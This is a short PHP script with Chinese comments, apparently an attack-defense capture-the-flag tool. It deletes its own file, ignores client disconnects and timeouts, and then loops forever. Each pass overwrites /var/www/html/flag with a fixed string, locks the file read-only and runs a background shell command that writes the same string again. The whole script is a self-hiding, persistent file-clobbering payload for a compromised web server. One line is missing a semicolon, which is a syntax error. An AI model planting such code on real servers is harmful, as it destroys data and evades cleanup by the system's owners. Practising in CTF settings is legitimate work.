<?php
@unlink($_SERVER['SCRIPT_FILENAME']); //删除自身
error_reporting(0); //禁用错误报告
ignore_user_abort(true); //忽略与用户的断开，用户浏览器断开后继续执行
set_time_limit(0); //执行不超时

while (true) {
    # 需要锁定的文件
    $filePath = '/var/www/html/flag';
    chmod($filePath, 0777);  //设置属性
    @unlink($filePath);
    file_put_contents($filePath, "xq17");
    chmod($filePath, 0444);  //设置属性
    usleep(1000);
    #挂载后台执行的命令
    $cmd = "nohup echo 'xq17' > /var/www/html/flag &"
    system($cmd);
}
?>